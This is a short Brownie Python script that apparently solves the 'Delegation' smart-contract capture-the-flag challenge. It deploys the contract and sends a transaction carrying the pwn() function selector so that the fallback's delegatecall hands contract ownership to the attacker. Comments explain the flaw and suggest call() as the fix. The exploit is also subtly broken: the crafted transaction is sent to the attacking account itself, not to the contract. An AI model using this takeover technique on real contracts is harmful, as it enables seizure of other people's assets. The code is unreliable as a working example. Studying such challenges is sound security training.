from brownie import Delegation, accounts, web3


def main():
  account_one, account_two = accounts[0], accounts[2]

  delegation_contract = Delegation.deploy(account_one, {
    'from': account_one,
    'gas_price': 500000
  })

  dg_owner = delegation_contract.getOwner.call({
    'from': account_one,
    'gas_price': 500000
  })
  print(f"dg-owner: {dg_owner} / account-one: {account_one}")

  account_two.transfer(to=account_two, data=web3.keccak(text='pwn()')[0:4], gas_price=50000)
  dg_owner = delegation_contract.owner.call()
  print(f"dg-owner: {dg_owner} / account-two: {account_two}")


  # Call function pwn() when calling fallback 
    # pwn() change owner to msg.sender 
      # since delegatecall --> will change owner of the Delegation contract, making me the owner 
        # secure: use call(), not delegatecall()

 


 

